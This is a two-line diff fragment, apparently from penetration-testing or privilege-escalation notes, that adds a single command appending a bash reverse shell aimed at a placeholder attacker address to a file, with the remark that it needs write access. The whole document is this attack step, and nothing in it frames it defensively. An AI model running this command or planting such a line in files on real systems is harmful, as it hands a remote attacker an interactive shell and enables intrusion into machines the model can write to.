@@ -1,0 +1,2 @@
+echo "bash -i >& /dev/tcp/<attackerip>/port 0>&1" >> file (having bash written access)
+
